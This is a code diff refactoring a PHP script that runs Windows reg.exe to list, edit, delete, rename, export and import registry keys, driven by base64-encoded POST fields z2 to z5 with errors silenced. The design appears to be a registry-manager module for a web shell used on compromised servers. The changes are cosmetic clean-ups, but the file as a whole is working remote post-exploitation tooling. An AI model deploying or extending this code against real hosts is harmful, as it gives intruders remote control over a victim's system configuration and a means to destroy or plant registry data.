@@ -1,9 +1,8 @@
 <?php
 
-@ini_set('display_errors','0');
+@ini_set('display_errors', '0');
 @set_time_limit(0);
 
-// Helper
 function run_reg(string $cmd, array &$output = null): int
 {
     $output = [];
@@ -24,22 +23,17 @@ function validate_value_name(string $name): bool
     return (bool)preg_match('/^[A-Za-z0-9 _\\-]+$/', $name);
 }
 
-// Functions
-
 function registry_value_to_bytes(string $value, string $type): string 
 {
     switch ($type) {
-
         case 'REG_DWORD':
             $value = preg_replace('/^0x/i', '', $value);
             $num = hexdec($value);
-
             return pack("V", $num);
 
         case 'REG_QWORD':
             $value = preg_replace('/^0x/i', '', $value);
             $num = hexdec($value);
-
             return pack("P", $num);
 
         case 'REG_BINARY':
@@ -85,7 +79,6 @@ function scan_registry(string $base_path): array
         $ret
     );
 
-    // Always return the same schema
     $result = [
         'success' => ($ret === 0),
         'error'    => null,
@@ -101,28 +94,24 @@ function scan_registry(string $base_path): array
     $firstKeySeen = false;
 
     foreach ($output as $line) {
-
         $line = rtrim($line);
 
         if ($line === '') {
             continue;
         }
 
-        // Registry key paths
+        // Catch active registry keys
         if (preg_match('/^HKEY_/', $line)) {
-
             if (!$firstKeySeen) {
                 $firstKeySeen = true;
             } else {
                 $result['subkeys'][] = $line;
             }
-
             continue;
         }
 
-        // Registry values
+        // Extract value types and configurations
         if (preg_match('/^\s*(.*?)\s+(REG_\w+)\s+(.*)$/', $line, $m)) {
-
             $type = trim($m[2]);
             $value = trim($m[3]);
 
@@ -164,12 +153,8 @@ function set_value(string $path, string $name, string $type, string $data): arra
         ];
     }
 
-    // Format data properly for reg.exe
     switch ($type) {
         case 'REG_DWORD':
-            $data = is_numeric($data) ? (string)$data : hexdec($data);
-            break;
-
         case 'REG_QWORD':
             $data = is_numeric($data) ? (string)$data : hexdec($data);
             break;
@@ -183,7 +168,6 @@ function set_value(string $path, string $name, string $type, string $data): arra
             break;
 
         default:
-            // REG_SZ / EXPAND_SZ
             break;
     }
 
@@ -195,6 +179,7 @@ function set_value(string $path, string $name, string $type, string $data): arra
         escapeshellarg($data)
     );
 
+    $out = [];
     run_reg($cmd, $out);
     $ok = (strpos(implode('\n', $out), 'ERROR') === false);
 
@@ -213,6 +198,7 @@ function delete_key(string $path) : array {
     }
 
     $cmd = sprintf('reg delete %s /f', escapeshellarg($path));
+    $out = [];
     $ret = run_reg($cmd, $out);
 
     return [
@@ -236,6 +222,7 @@ function delete_value(string $path, string $name): array
         escapeshellarg($name)
     );
 
+    $out = [];
     run_reg($cmd, $out);
 
     return [
@@ -259,7 +246,6 @@ function rename_value(string $path, string $oldName, string $newName): array
     foreach ($scan['values'] as $v) {
         if ($v['name'] === $oldName) {
             $valueData = $v;
-
             break;
         }
     }
@@ -296,6 +282,7 @@ function rename_key(string $oldPath, string $newPath): array
         escapeshellarg($newPath)
     );
 
+    $out = [];
     run_reg($cmd, $out);
 
     $ok = (strpos(implode("\n", $out), 'ERROR') === false);
@@ -307,12 +294,12 @@ function rename_key(string $oldPath, string $newPath): array
         ];
     }
 
-    // delete old key
     $cmd2 = sprintf(
         'reg delete %s /f',
         escapeshellarg($oldPath)
     );
 
+    $out2 = [];
     run_reg($cmd2, $out2);
 
     return [
@@ -330,6 +317,7 @@ function create_key(string $path) : array {
     }
 
     $cmd = sprintf('reg add %s /f', escapeshellarg($path));
+    $out = [];
     $ret = run_reg($cmd, $out);
 
     return [
@@ -346,13 +334,14 @@ function export_key(string $path) : array {
         ];
     }
 
-    $tmp = tempnam(sys_get_temp_dir(), 'reg_' . '.reg');
+    $tmp = tempnam(sys_get_temp_dir(), 'reg_');
     $cmd = sprintf(
         'reg export %s %s /y',
         escapeshellarg($path),
         escapeshellarg($tmp)
     );
 
+    $out = [];
     $ret = run_reg($cmd, $out);
     if ($ret !== 0 || !file_exists($tmp)) {
         return [
@@ -375,6 +364,7 @@ function import_file(string $content) : array {
     file_put_contents($tmp, $content);
 
     $cmd = sprintf('reg import %s', escapeshellarg($tmp));
+    $out = [];
     $ret = run_reg($cmd, $out);
 
     unlink($tmp);
@@ -400,64 +390,51 @@ $hives = [
 
 switch ($action) {
     case 'hive':
-        echo json_encode(
-            scan_hives($hives),
-            JSON_UNESCAPED_UNICODE
-        );
+        echo json_encode(scan_hives($hives), JSON_UNESCAPED_UNICODE);
         break;
     case 'scan':
         $base_path = base64_decode($_POST['z2'] ?? '') ?: '';
-        echo json_encode(
-            scan_registry($base_path),
-            JSON_UNESCAPED_UNICODE
-        );
+        echo json_encode(scan_registry($base_path), JSON_UNESCAPED_UNICODE);
         break;
     case 'set':
+    case 'new_value':
         echo json_encode(set_value(
-            base64_decode($_POST['z2']),    // path
-            base64_decode($_POST['z3']),    // name
-            base64_decode($_POST['z4']),    // type
-            base64_decode($_POST['z5'])     // data
+            base64_decode($_POST['z2'] ?? ''),
+            base64_decode($_POST['z3'] ?? ''),
+            base64_decode($_POST['z4'] ?? ''),
+            base64_decode($_POST['z5'] ?? '')
         ));
         break;
     case 'del_key':
-        echo json_encode(delete_key(base64_decode($_POST['z2'])));
+        echo json_encode(delete_key(base64_decode($_POST['z2'] ?? '')));
         break;
     case 'del_value':
         echo json_encode(delete_value(
-            base64_decode($_POST['z2']),    // path
-            base64_decode($_POST['z3'])     // name
+            base64_decode($_POST['z2'] ?? ''),
+            base64_decode($_POST['z3'] ?? '')
         ));
         break;
     case 'rename_key':
         echo json_encode(rename_key(
-            base64_decode($_POST['z2']),    // old path
-            base64_decode($_POST['z3'])     // new path
+            base64_decode($_POST['z2'] ?? ''),
+            base64_decode($_POST['z3'] ?? '')
         ));
         break;
     case 'rename_value':
         echo json_encode(rename_value(
-            base64_decode($_POST['z2']),    // path
-            base64_decode($_POST['z3']),    // old name
-            base64_decode($_POST['z4'])     // new name
+            base64_decode($_POST['z2'] ?? ''),
+            base64_decode($_POST['z3'] ?? ''),
+            base64_decode($_POST['z4'] ?? '')
         ));
         break;
     case 'new_key':
-        echo json_encode(create_key(base64_decode($_POST['z2'])));
-        break;
-    case 'new_value':
-        echo json_encode(set_value(
-            base64_decode($_POST['z2']),    // path
-            base64_decode($_POST['z3']),    // name
-            base64_decode($_POST['z4']),    // type
-            base64_decode($_POST['z5']),
-        ));
+        echo json_encode(create_key(base64_decode($_POST['z2'] ?? '')));
         break;
     case 'export':
-        echo json_encode(export_key(base64_decode($_POST['z2'])));
+        echo json_encode(export_key(base64_decode($_POST['z2'] ?? '')));
         break;
     case 'import':
-        echo json_encode(import_file(base64_decode($_POST['z2'])));
+        echo json_encode(import_file(base64_decode($_POST['z2'] ?? '')));
         break;
     default:
         echo json_encode([
@@ -468,3 +445,5 @@ switch ($action) {
         ]);
         break;
 }
+
+?>
